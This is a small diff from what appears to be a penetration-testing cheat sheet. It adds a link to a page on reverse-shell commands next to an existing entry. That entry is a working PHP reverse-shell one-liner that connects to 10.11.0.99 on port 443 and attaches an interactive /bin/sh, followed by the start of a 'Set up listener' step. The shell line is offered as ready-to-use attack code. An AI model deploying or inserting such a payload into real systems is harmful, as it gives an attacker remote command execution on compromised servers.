@@ -127,6 +127,7 @@ TODO: USAGE
 		```
 		<?php $sock = fsockopen("10.11.0.99",443);$proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);?>
 		```
+		[Reverse Shell Details](http://lerned.wikidot.com/reverse-shell-command)
 
 		Set up listener
 		```
